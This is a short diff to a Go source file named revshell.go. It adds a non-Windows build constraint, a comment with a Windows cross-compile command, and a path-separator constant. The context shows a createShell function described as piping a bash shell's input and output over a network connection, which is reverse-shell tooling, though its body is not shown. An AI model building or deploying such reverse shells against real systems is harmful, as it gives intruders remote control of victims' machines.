@@ -1,3 +1,5 @@
+// +build !windows
+
 package main
 
 import (
@@ -7,6 +9,10 @@ import (
 	"os/exec"
 	//"io"
 )
+
+// GOOS=windows go build ./revshell.go
+
+const PathSeparator = "\\"
 
 //executes a bash shell and pipes in/out/err over the connection
 func createShell(connection net.Conn) {
